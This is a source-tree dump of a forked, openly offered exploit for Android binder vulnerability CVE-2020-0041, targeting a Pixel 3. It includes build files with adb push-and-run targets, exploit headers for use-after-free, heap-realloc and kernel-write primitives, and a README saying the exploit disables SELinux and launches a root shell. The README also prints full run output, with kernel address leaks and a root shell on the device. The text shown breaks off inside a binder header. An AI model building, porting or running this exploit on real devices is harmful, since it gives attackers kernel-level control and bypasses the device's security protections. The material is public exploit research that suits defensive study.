Project Path: arc_j4nn_CVE-2020-0041__jk7j_mu

Source Tree:

```txt
arc_j4nn_CVE-2020-0041__jk7j_mu
├── Android.mk
├── Application.mk
├── COPYING
├── Makefile
├── README-lpe.md
├── README.md
├── include
│   ├── binder.h
│   ├── binder_lookup.h
│   ├── endpoint.h
│   ├── exploit.h
│   ├── handle.h
│   ├── helpers.h
│   ├── log.h
│   ├── node.h
│   ├── pending_node.h
│   ├── realloc.h
│   └── uapi_binder.h
└── src
    ├── binder.c
    ├── binder_lookup.c
    ├── endpoint.c
    ├── exploit.c
    ├── helpers.c
    ├── log.c
    ├── node.c
    ├── pending_node.c
    └── realloc.c

```

`Android.mk`:

```mk
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE := poc
LOCAL_CFLAGS += -Iinclude -DBINDER_DEVICE="\"/dev/hwbinder\""
LOCAL_SRC_FILES := src/exploit.c src/endpoint.c src/pending_node.c src/binder.c src/log.c src/helpers.c  src/binder_lookup.c src/realloc.c src/node.c

include $(BUILD_EXECUTABLE)



```

`Application.mk`:

```mk
APP_ABI := arm64-v8a
APP_PLATFORM := android-24
APP_BUILD_SCRIPT := Android.mk
```

`COPYING`:

```
                    GNU GENERAL PUBLIC LICENSE
                       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The licenses for most software are designed to take away your
freedom to share and change it.  By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users.  This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it.  (Some other Free Software Foundation software is covered by
the GNU Lesser General Public License instead.)  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
this service if you wish), that you receive source code or can get it
if you want it, that you can change the software or use pieces of it
in new free programs; and that you know you can do these things.

  To protect your rights, we need to make restrictions that forbid
anyone to deny you these rights or to ask you to surrender the rights.
These restrictions translate to certain responsibilities for you if you
distribute copies of the software, or if you modify it.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must give the recipients all the rights that
you have.  You must make sure that they, too, receive or can get the
source code.  And you must show them these terms so they know their
rights.

  We protect your rights with two steps: (1) copyright the software, and
(2) offer you this license which gives you legal permission to copy,
distribute and/or modify the software.

  Also, for each author's protection and ours, we want to make certain
that everyone understands that there is no warranty for this free
software.  If the software is modified by someone else and passed on, we
want its recipients to know that what they have is not the original, so
that any problems introduced by others will not reflect on the original
authors' reputations.

  Finally, any free program is threatened constantly by software
patents.  We wish to avoid the danger that redistributors of a free
program will individually obtain patent licenses, in effect making the
program proprietary.  To prevent this, we have made it clear that any
patent must be licensed for everyone's free use or not licensed at all.

  The precise terms and conditions for copying, distribution and
modification follow.

                    GNU GENERAL PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. This License applies to any program or other work which contains
a notice placed by the copyright holder saying it may be distributed
under the terms of this General Public License.  The "Program", below,
refers to any such program or work, and a "work based on the Program"
means either the Program or any derivative work under copyright law:
that is to say, a work containing the Program or a portion of it,
either verbatim or with modifications and/or translated into another
language.  (Hereinafter, translation is included without limitation in
the term "modification".)  Each licensee is addressed as "you".

Activities other than copying, distribution and modification are not
covered by this License; they are outside its scope.  The act of
running the Program is not restricted, and the output from the Program
is covered only if its contents constitute a work based on the
Program (independent of having been made by running the Program).
Whether that is true depends on what the Program does.

  1. You may copy and distribute verbatim copies of the Program's
source code as you receive it, in any medium, provided that you
conspicuously and appropriately publish on each copy an appropriate
copyright notice and disclaimer of warranty; keep intact all the
notices that refer to this License and to the absence of any warranty;
and give any other recipients of the Program a copy of this License
along with the Program.

You may charge a fee for the physical act of transferring a copy, and
you may at your option offer warranty protection in exchange for a fee.

  2. You may modify your copy or copies of the Program or any portion
of it, thus forming a work based on the Program, and copy and
distribute such modifications or work under the terms of Section 1
above, provided that you also meet all of these conditions:

    a) You must cause the modified files to carry prominent notices
    stating that you changed the files and the date of any change.

    b) You must cause any work that you distribute or publish, that in
    whole or in part contains or is derived from the Program or any
    part thereof, to be licensed as a whole at no charge to all third
    parties under the terms of this License.

    c) If the modified program normally reads commands interactively
    when run, you must cause it, when started running for such
    interactive use in the most ordinary way, to print or display an
    announcement including an appropriate copyright notice and a
    notice that there is no warranty (or else, saying that you provide
    a warranty) and that users may redistribute the program under
    these conditions, and telling the user how to view a copy of this
    License.  (Exception: if the Program itself is interactive but
    does not normally print such an announcement, your work based on
    the Program is not required to print an announcement.)

These requirements apply to the modified work as a whole.  If
identifiable sections of that work are not derived from the Program,
and can be reasonably considered independent and separate works in
themselves, then this License, and its terms, do not apply to those
sections when you distribute them as separate works.  But when you
distribute the same sections as part of a whole which is a work based
on the Program, the distribution of the whole must be on the terms of
this License, whose permissions for other licensees extend to the
entire whole, and thus to each and every part regardless of who wrote it.

Thus, it is not the intent of this section to claim rights or contest
your rights to work written entirely by you; rather, the intent is to
exercise the right to control the distribution of derivative or
collective works based on the Program.

In addition, mere aggregation of another work not based on the Program
with the Program (or with a work based on the Program) on a volume of
a storage or distribution medium does not bring the other work under
the scope of this License.

  3. You may copy and distribute the Program (or a work based on it,
under Section 2) in object code or executable form under the terms of
Sections 1 and 2 above provided that you also do one of the following:

    a) Accompany it with the complete corresponding machine-readable
    source code, which must be distributed under the terms of Sections
    1 and 2 above on a medium customarily used for software interchange; or,

    b) Accompany it with a written offer, valid for at least three
    years, to give any third party, for a charge no more than your
    cost of physically performing source distribution, a complete
    machine-readable copy of the corresponding source code, to be
    distributed under the terms of Sections 1 and 2 above on a medium
    customarily used for software interchange; or,

    c) Accompany it with the information you received as to the offer
    to distribute corresponding source code.  (This alternative is
    allowed only for noncommercial distribution and only if you
    received the program in object code or executable form with such
    an offer, in accord with Subsection b above.)

The source code for a work means the preferred form of the work for
making modifications to it.  For an executable work, complete source
code means all the source code for all modules it contains, plus any
associated interface definition files, plus the scripts used to
control compilation and installation of the executable.  However, as a
special exception, the source code distributed need not include
anything that is normally distributed (in either source or binary
form) with the major components (compiler, kernel, and so on) of the
operating system on which the executable runs, unless that component
itself accompanies the executable.

If distribution of executable or object code is made by offering
access to copy from a designated place, then offering equivalent
access to copy the source code from the same place counts as
distribution of the source code, even though third parties are not
compelled to copy the source along with the object code.

  4. You may not copy, modify, sublicense, or distribute the Program
except as expressly provided under this License.  Any attempt
otherwise to copy, modify, sublicense or distribute the Program is
void, and will automatically terminate your rights under this License.
However, parties who have received copies, or rights, from you under
this License will not have their licenses terminated so long as such
parties remain in full compliance.

  5. You are not required to accept this License, since you have not
signed it.  However, nothing else grants you permission to modify or
distribute the Program or its derivative works.  These actions are
prohibited by law if you do not accept this License.  Therefore, by
modifying or distributing the Program (or any work based on the
Program), you indicate your acceptance of this License to do so, and
all its terms and conditions for copying, distributing or modifying
the Program or works based on it.

  6. Each time you redistribute the Program (or any work based on the
Program), the recipient automatically receives a license from the
original licensor to copy, distribute or modify the Program subject to
these terms and conditions.  You may not impose any further
restrictions on the recipients' exercise of the rights granted herein.
You are not responsible for enforcing compliance by third parties to
this License.

  7. If, as a consequence of a court judgment or allegation of patent
infringement or for any other reason (not limited to patent issues),
conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot
distribute so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you
may not distribute the Program at all.  For example, if a patent
license would not permit royalty-free redistribution of the Program by
all those who receive copies directly or indirectly through you, then
the only way you could satisfy both it and this License would be to
refrain entirely from distribution of the Program.

If any portion of this section is held invalid or unenforceable under
any particular circumstance, the balance of the section is intended to
apply and the section as a whole is intended to apply in other
circumstances.

It is not the purpose of this section to induce you to infringe any
patents or other property right claims or to contest validity of any
such claims; this section has the sole purpose of protecting the
integrity of the free software distribution system, which is
implemented by public license practices.  Many people have made
generous contributions to the wide range of software distributed
through that system in reliance on consistent application of that
system; it is up to the author/donor to decide if he or she is willing
to distribute software through any other system and a licensee cannot
impose that choice.

This section is intended to make thoroughly clear what is believed to
be a consequence of the rest of this License.

  8. If the distribution and/or use of the Program is restricted in
certain countries either by patents or by copyrighted interfaces, the
original copyright holder who places the Program under this License
may add an explicit geographical distribution limitation excluding
those countries, so that distribution is permitted only in or among
countries not thus excluded.  In such case, this License incorporates
the limitation as if written in the body of this License.

  9. The Free Software Foundation may publish revised and/or new versions
of the General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

Each version is given a distinguishing version number.  If the Program
specifies a version number of this License which applies to it and "any
later version", you have the option of following the terms and conditions
either of that version or of any later version published by the Free
Software Foundation.  If the Program does not specify a version number of
this License, you may choose any version ever published by the Free Software
Foundation.

  10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author
to ask for permission.  For software which is copyrighted by the Free
Software Foundation, write to the Free Software Foundation; we sometimes
make exceptions for this.  Our decision will be guided by the two goals
of preserving the free status of all derivatives of our free software and
of promoting the sharing and reuse of software generally.

                            NO WARRANTY

  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
REPAIR OR CORRECTION.

  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
POSSIBILITY OF SUCH DAMAGES.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
convey the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

Also add information on how to contact you by electronic and paper mail.

If the program is interactive, make it output a short notice like this
when it starts in an interactive mode:

    Gnomovision version 69, Copyright (C) year name of author
    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, the commands you use may
be called something other than `show w' and `show c'; they could even be
mouse-clicks or menu items--whatever suits your program.

You should also get your employer (if you work as a programmer) or your
school, if any, to sign a "copyright disclaimer" for the program, if
necessary.  Here is a sample; alter the names:

  Yoyodyne, Inc., hereby disclaims all copyright interest in the program
  `Gnomovision' (which makes passes at compilers) written by James Hacker.

  <signature of Ty Coon>, 1 April 1989
  Ty Coon, President of Vice

This General Public License does not permit incorporating your program into
proprietary programs.  If your program is a subroutine library, you may
consider it more useful to permit linking proprietary applications with the
library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.

```

`Makefile`:

```
# Assume nkd-build is in the path
NDK_BUILD := NDK_PROJECT_PATH=. ndk-build NDK_APPLICATION_MK=./Application.mk
# Retrieve binary name from Android.mk
BIN := $(shell cat Android.mk | grep LOCAL_MODULE  | head -n1 | cut -d' ' -f3)

BIN_PATH := libs/arm64-v8a/$(BIN)

all: android 

$(BIN_PATH):
	$(NDK_BUILD)

android:
	@echo "Building Android"
	$(NDK_BUILD)

push: $(BIN_PATH) $(LOADER)
	adb push $(BIN_PATH) /data/local/tmp/$(notdir $(BIN_PATH))

shell: push
	adb shell /data/local/tmp/$(BIN)

clean:
	$(NDK_BUILD) clean
	-adb shell rm /data/local/tmp/$(notdir $(BIN_PATH))

distclean: clean
	$(RM) -rf libs obj

```

`README-lpe.md`:

```md
# CVE-2020-0041: privilege escalation exploit

This folder contains the local privilege escalation exploit we wrote for CVE-2020-0041. 
The exploit is provided with hardcoded offsets for a Pixel 3 device running the February 
2020 firmware (QQ1A.200205.002). The exploit needs to be adapted before being able to 
run it on other vulnerable devices or Pixel 3 devices with different firmware versions.

The exploit disables SELinux and then launches a root shell.

## Testing the exploit

The exploit can be built by simply running "make" with the Android NDK in the path. It can also 
be pushed to a phone attached with adb by doing "make all push" (warnings removed for brevity):

```
user@laptop:~/CVE-2020-0041/lpe$ make all push
Building Android
NDK_PROJECT_PATH=. ndk-build NDK_APPLICATION_MK=./Application.mk
make[1]: Entering directory `/home/user/CVE-2020-0041/lpe'
[arm64-v8a] Compile        : poc <= exploit.c
[arm64-v8a] Compile        : poc <= endpoint.c
[arm64-v8a] Compile        : poc <= pending_node.c
[arm64-v8a] Compile        : poc <= binder.c
[arm64-v8a] Compile        : poc <= log.c
[arm64-v8a] Compile        : poc <= helpers.c
[arm64-v8a] Compile        : poc <= binder_lookup.c
[arm64-v8a] Compile        : poc <= realloc.c
[arm64-v8a] Compile        : poc <= node.c
[arm64-v8a] Executable     : poc
[arm64-v8a] Install        : poc => libs/arm64-v8a/poc
make[1]: Leaving directory `/home/user/CVE-2020-0041/lpe'
adb push libs/arm64-v8a/poc /data/local/tmp/poc
libs/arm64-v8a/poc: 1 file pushed. 4.3 MB/s (39016 bytes in 0.009s)
```

Now just run /data/local/tmp/poc from an adb shell to see the exploit running:

```
blueline:/ $ /data/local/tmp/poc
[+] Mapped 200000
[+] selinux_enforcing before exploit: 1
[+] pipe file: 0xffffffd9c67c7700
[*] file epitem at ffffffda545d7d00
[*] Reallocating content of 'write8_inode' with controlled data.[DONE]
[+] Overwriting 0xffffffd9c67c7720 with 0xffffffda545d7d50...[DONE]
[*] Write done, should have arbitrary read now.
[+] file operations: ffffff97df1af650
[+] kernel base: ffffff97dd280000
[*] Reallocating content of 'write8_selinux' with controlled data.[DONE]
[+] Overwriting 0xffffff97dfe24000 with 0x0...[DONE]
[*] init_cred: ffffff97dfc300a0
[+] memstart_addr: 0xffffffe700000000
[+] First level entry: ceac5003 -> next table at ffffffd9ceac5000
[+] Second level entry: f173c003 -> next table at ffffffd9f173c000
[+] sysctl_table_root = ffffff97dfc5a3f8
[*] Reallocating content of 'write8_sysctl' with controlled data.[DONE]
[+] Overwriting 0xffffffda6da8d868 with 0xffffffda49ced000...[DONE]
[+] Injected sysctl node!
[*] Node write8_inode, pid 7058, kaddr ffffffda0723f900
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Node write8_selinux, pid 6848, kaddr ffffffd9c9fa2400
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Node write8_sysctl, pid 7110, kaddr ffffffda67e7d180
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[+] Cleaned up sendmsg threads
[*] epitem.next = ffffffd9c67c7720
[*] epitem.prev = ffffffd9c67c77d8
^[[*] Launching privileged shell
root_by_cve-2020-0041:/ # id   
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root_by_cve-2020-0041:/ # getenforce
Permissive
root_by_cve-2020-0041:/ # 
```

```

`README.md`:

```md
# CVE-2020-0041

This repository contains LPE code for exploiting CVE-2020-0041 implemented by bluefrostsecurity as released at https://github.com/bluefrostsecurity/CVE-2020-0041/tree/master/lpe .
The exploitation approach for this part can be found at https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/ .

This forked repository shall host ports for other kernels / devices in their specific branches.
Big thanks to bluefrostsecurity for their awesome writeup and the exploit release.

```

`include/binder.h`:

```h
/* Copyright 2008 The Android Open Source Project
 */

#ifndef _BINDER_H_
#define _BINDER_H_

#include <sys/ioctl.h>
#include <stdbool.h>
#include <stdint.h>
#include "uapi_binder.h"

struct binder_state
{
    int fd;
    void *mapped;
    size_t mapsize;
};

struct binder_io
{
    char *data;            /* pointer to read/write from */
    binder_size_t *offs;   /* array of offsets */
    size_t data_avail;     /* bytes available in data buffer */
    size_t offs_avail;     /* entries available in offsets array */

    char *data0;           /* start of data buffer */
    binder_size_t *offs0;  /* start of offsets buffer */
    uint32_t flags;
    uint32_t unused;
};

struct binder_death {
    void (*func)(struct binder_state *bs, void *ptr);
    void *ptr;
};

/* the one magic handle */
#define BINDER_SERVICE_MANAGER  0U

#define SVC_MGR_NAME "android.os.IServiceManager"

enum {
    /* Must match definitions in IBinder.h and IServiceManager.h */
    PING_TRANSACTION  = B_PACK_CHARS('_','P','N','G'),
    SVC_MGR_GET_SERVICE = 1,
    SVC_MGR_CHECK_SERVICE,
    SVC_MGR_ADD_SERVICE,
    SVC_MGR_LIST_SERVICES,
    SVC_MGR_GET_RANDOM,
};

typedef int (*binder_handler)(struct binder_state *bs,
                              struct binder_transaction_data *txn,
                              struct binder_io *msg,
                              struct binder_io *reply);

struct binder_state *binder_open(const char* driver, size_t mapsize);
void binder_close(struct binder_state *bs);

/* initiate a blocking binder call
 * - returns zero on success
 */
int binder_call(struct binder_state *bs,
                struct binder_io *msg, struct binder_io *reply,
                uint32_t target, uint32_t code);

int binder_call2(struct binder_state *bs,
                struct binder_io *msg, struct binder_io *reply,
                uint32_t target, uint32_t code, char *buffer);

/* release any state associate with the binder_io
 * - call once any necessary data has been extracted from the
 *   binder_io after binder_call() returns
 * - can safely be called even if binder_call() fails
 */
void binder_done(struct binder_state *bs,
                 struct binder_io *msg, struct binder_io *reply);

/* manipulate strong references */
void binder_acquire(struct binder_state *bs, uint32_t target);
void binder_release(struct binder_state *bs, uint32_t target);

void binder_link_to_death(struct binder_state *bs, uint32_t target, struct binder_death *death);

void binder_loop(struct binder_state *bs, binder_handler func);

int binder_become_context_manager(struct binder_state *bs);

/* allocate a binder_io, providing a stack-allocated working
 * buffer, size of the working buffer, and how many object
 * offset entries to reserve from the buffer
 */
void bio_init(struct binder_io *bio, void *data,
           size_t maxdata, size_t maxobjects);

void bio_put_obj(struct binder_io *bio, void *ptr);
void bio_put_ref(struct binder_io *bio, uint32_t handle);
void bio_put_fd(struct binder_io *bio, int fd);
void *bio_put_ptr(struct binder_io *bio, void *buffer, uint32_t size, uint32_t *off);
void bio_put_fd_array(struct binder_io *bio, uint64_t parent, uint64_t parent_offset, int num_fds);
void bio_put_uint32(struct binder_io *bio, uint32_t n);
void bio_put_string16(struct binder_io *bio, const uint16_t *str);
void bio_put_string16_x(struct binder_io *bio, const char *_str);

uint32_t bio_get_uint32(struct binder_io *bio);
uint16_t *bio_get_string16(struct binder_io *bio, size_t *sz);
uint32_t bio_get_ref(struct binder_io *bio);
void *bio_alloc(struct binder_io *bio, size_t size);

int binder_write(struct binder_state *bs, void *data, size_t len);
int binder_read(int fd, void *buffer, size_t size);
int binder_transaction(struct binder_state *bs, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size);

void binder_free_buffer(struct binder_state *bs, binder_uintptr_t buffer_to_free);
void binder_free_buffers(struct binder_state *bs, binder_uintptr_t buffer_to_free);



#endif

```

`include/binder_lookup.h`:

```h
#ifndef __BINDER_LOOKUP_H

#define __BINDER_LOOKUP_H

int publish_handle(struct binder_state *bs, uint64_t handle, char *name);
uint32_t grab_handle(struct binder_state *bs, char *name);
uint32_t grab_handle_and_buffer(struct binder_state *bs, char *name, uint64_t *buffer_end);
void cleanup_lookup(struct binder_state *bs);
int lookup_service(struct binder_state *bs, char *name);

#endif

```

`include/endpoint.h`:

```h
#ifndef ENDPOINT_H_
# define ENDPOINT_H_
#include <setjmp.h>

struct endpoint_handle {
	struct endpoint_info *next;
	uint8_t *name;
	struct binder_state *bs;
	void *stack;
	pid_t pid;
	pthread_barrier_t barrier;
	int status;
	uint64_t client_handle;
	uint64_t reserved_buffer;
	jmp_buf env;
};



typedef enum {
	GET_VMA_START = 0,
	EXCHANGE_HANDLES,
	ADD_PENDING_NODE,
	TERMINATE_PENDING_NODE,
	RESERVE_BUFFER,
	FREE_RESERVED_BUFFER,
	TRIGGER_DECREF,
} endpoint_cmd_t;


bool bootstrap_endpoint(const char *endpoint_name);
bool terminate_endpoint(const char *endpoint_name);
struct endpoint_handle *get_endpoints();



#endif /*! ENDPOINT_H_ */

```

`include/exploit.h`:

```h
#ifndef EXPLOIT_H_
#define EXPLOIT_H_

#include "node.h"

uint64_t setup_pending_nodes(struct binder_state *bs, uint64_t endpoint_handle, pthread_t *th, uint32_t n1, uint32_t n2);

#endif /*! EXPLOIT_H_ */

```

`include/handle.h`:

```h
#ifndef HANDLE_H_
#define HANDLE_H_
#include <stdint.h>
#include "binder.h"

bool publish_handle(struct binder_state *bs, uint64_t handle, const char *srv_name);
uint64_t grab_handle(struct binder_state *bs, const char *srv_name);


#endif /*! HANDLE_H_ */

```

`include/helpers.h`:

```h
#ifndef HELPERS_H_
#define HELPERS_H_

bool pin_cpu(int cpu);

#endif /*! HELPERS_H_ */

```

`include/log.h`:

```h
#ifndef __LOG_H_
#define __LOG_H_

#include <stdio.h>

#define ALOGE(...) printf(__VA_ARGS__)
#define ALOGI(...) printf(__VA_ARGS__)
ssize_t log_info(const char *format, ...);
ssize_t log_err(const char *format, ...);
#endif

```

`include/node.h`:

```h
#ifndef NODE_H_
#define NODE_H_
#include <stdint.h>
#include <stdbool.h>

#include "binder.h"
#include "pending_node.h"

struct exp_node {
	struct binder_state *bs;
	uint64_t handle;
	const char *endpoint_name;
   uint8_t name[16];
	uint64_t vma_start;
	bool second;
	pthread_t *th;
	int idx;
   int max;
   struct pending_node *pending_nodes;
   int num_pending;
	uint64_t addr;
   uint64_t kaddr;
	int target_fd;
	uint64_t file_addr;
	int ep_fd;
	pid_t tid;
};

/* exp_node API. */

struct exp_node *node_new(const char *name);
void node_free(struct exp_node *node);
bool node_reset(struct exp_node *node);

/* This are the kernel related operations. */
void node_kfree(struct exp_node *node);
bool node_realloc_content(struct exp_node *node, void *data, size_t size);
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where);
bool node_write_null(struct exp_node *node, uint64_t where);


bool node_realloc(struct exp_node *node, void *content, size_t size);
struct exp_node *node_create(uint8_t *endpoint_name, int target_fd);
static struct exp_node *_node_create(uint8_t *endpoint_name, int target_fd);
void node_destroy(struct exp_node *node);
bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B);
bool node_leak_addr_and_kbase(struct exp_node *node, uint64_t *text);
#endif /*! NODE_H_ */

```

`include/pending_node.h`:

```h
#ifndef PENDING_NODE_H_
#define PENDING_NODE_H_

typedef enum node_state
{
	NODE_NOT_READY,
	NODE_FINISHED,
   NODE_READY,
	NODE_LEAKED,
	NODE_FREE,
} node_state;

typedef struct pending_node
{
	node_state state;
	struct pending_node *next;
	struct binder_state *bs;
	pthread_barrier_t barrier; /* Barrier. */
   pthread_barrier_t ready; 
   pthread_barrier_t do_barrier;
   pthread_barrier_t done_barrier;
	uint64_t uaf_buffer; /* Address of binder buffer. */
	pthread_t uaf_node_th;
	uint64_t uaf_node;
	uint64_t leaked_data[2];

} pending_node;


void *pending_node_thread(void *args);
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node);
pthread_t pending_node_create(struct binder_state *bs, uint64_t node);

#endif /*! PENDING_NODE_H_ */

```

`include/realloc.h`:

```h
#ifndef REALLOC_H_
#define REALLOC_H_

#define NREALLOC 0x80 * 8
#define BUFSZ	0x80

void *realloc_thread(void *args);
void spawn_realloc_threads();
void cleanup_realloc_threads();
void setup_realloc_buffer(void *content, size_t size);
bool discard_realloc_thread(pid_t pid);


#endif /*! REALLOC_H_ */

```

`include/uapi_binder.h`:

```h
/*
 * Copyright (C) 2008 Google, Inc.
 *
 * Based on, but no longer compatible with, the original
 * OpenBinder.org binder driver interface, which is:
 *
 * Copyright (c) 2005 Palmsource, Inc.
 *
 * This software is licensed under the terms of the GNU General Public
 * License version 2, as published by the Free Software Foundation, and
 * may be copied, distributed, and modified under those terms.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 */

#ifndef _UAPI_LINUX_BINDER_H
#define _UAPI_LINUX_BINDER_H

#include <linux/types.h>
#include <linux/ioctl.h>
#include <unistd.h>

#define B_PACK_CHARS(c1, c2, c3, c4) \
	((((c1)<<24)) | (((c2)<<16)) | (((c3)<<8)) | (c4))
#define B_TYPE_LARGE 0x85

enum {
	BINDER_TYPE_BINDER	= B_PACK_CHARS('s', 'b', '*', B_TYPE_LARGE),
	BINDER_TYPE_WEAK_BINDER	= B_PACK_CHARS('w', 'b', '*', B_TYPE_LARGE),
	BINDER_TYPE_HANDLE	= B_PACK_CHARS('s', 'h', '*', B_TYPE_LARGE),
	BINDER_TYPE_WEAK_HANDLE	= B_PACK_CHARS('w', 'h', '*', B_TYPE_LARGE),
	BINDER_TYPE_FD		= B_PACK_CHARS('f', 'd', '*', B_TYPE_LARGE),
	BINDER_TYPE_FDA		= B_PACK_CHARS('f', 'd', 'a', B_TYPE_LARGE),
	BINDER_TYPE_PTR		= B_PACK_CHARS('p', 't', '*', B_TYPE_LARGE),
};

/**
 * enum flat_binder_object_shifts: shift values for flat_binder_object_flags
 * @FLAT_BINDER_FLAG_SCHED_POLICY_SHIFT: shift for getting scheduler policy.
 *
 */
enum flat_binder_object_shifts {
	FLAT_BINDER_FLAG_SCHED_POLICY_SHIFT = 9,
};

/**
 * enum flat_binder_object_flags - flags for use in flat_binder_object.flags
 */
enum flat_binder_object_flags {
	/**
	 * @FLAT_BINDER_FLAG_PRIORITY_MASK: bit-mask for min scheduler priority
	 *
	 * These bits can be used to set the minimum scheduler priority
	 * at which transactions into this node should run. Valid values
	 * in these bits depend on the scheduler policy encoded in
	 * @FLAT_BINDER_FLAG_SCHED_POLICY_MASK.
	 *
	 * For SCHED_NORMAL/SCHED_BATCH, the valid range is between [-20..19]
	 * For SCHED_FIFO/SCHED_RR, the value can run between [1..99]
	 */
	FLAT_BINDER_FLAG_PRIORITY_MASK = 0xff,
	/**
	 * @FLAT_BINDER_FLAG_ACCEPTS_FDS: whether the node accepts fds.
	 */
	FLAT_BINDER_FLAG_ACCEPTS_FDS = 0x100,
	/**
	 * @FLAT_BINDER_FLAG_SCHED_POLICY_MASK: bit-mask for scheduling policy
	 *
	 * These two bits can be used to set the min scheduling policy at which
	 * transactions on this node should run. These match the UAPI
	 * scheduler policy values, eg:
	 * 00b: SCHED_NORMAL
	 * 01b: SCHED_FIFO
	 * 10b: SCHED_RR
	 * 11b: SCHED_BATCH
	 */
	FLAT_BINDER_FLAG_SCHED_POLICY_MASK =
		3U << FLAT_BINDER_FLAG_SCHED_POLICY_SHIFT,

	/**
	 * @FLAT_BINDER_FLAG_INHERIT_RT: whether the node inherits RT policy
	 *
	 * Only when set, calls into this node will inherit a real-time
	 * scheduling policy from the caller (for synchronous transactions).
	 */
	FLAT_BINDER_FLAG_INHERIT_RT = 0x800,
};

#ifdef BINDER_IPC_32BIT
typedef __u32 binder_size_t;
typedef __u32 binder_uintptr_t;
#else
typedef __u64 binder_size_t;
typedef __u64 binder_uintptr_t;
#endif

/**
 * struct binder_object_header - header shared by all binder metadata objects.
 * @type:	type of the object
 */
struct binder_object_header {
	__u32        type;
};

/*
 * This is the flattened representation of a Binder object for transfer
 * between processes.  The 'offsets' supplied as part of a binder transaction
 * contains offsets into the data where these structures occur.  The Binder
 * driver takes care of re-writing the structure type and data as it moves
 * between processes.
 */
struct flat_binder_object {
	struct binder_object_header	hdr;
	__u32				flags;

	/* 8 bytes of data. */
	union {
		binder_uintptr_t	binder;	/* local object */
		__u32			handle;	/* remote object */
	};

	/* extra data associated with local object */
	binder_uintptr_t	cookie;
};

/**
 * struct binder_fd_object - describes a filedescriptor to be fixed up.
 * @hdr:	common header structure
 * @pad_flags:	padding to remain compatible with old userspace code
 * @pad_binder:	padding to remain compatible with old userspace code
 * @fd:		file descriptor
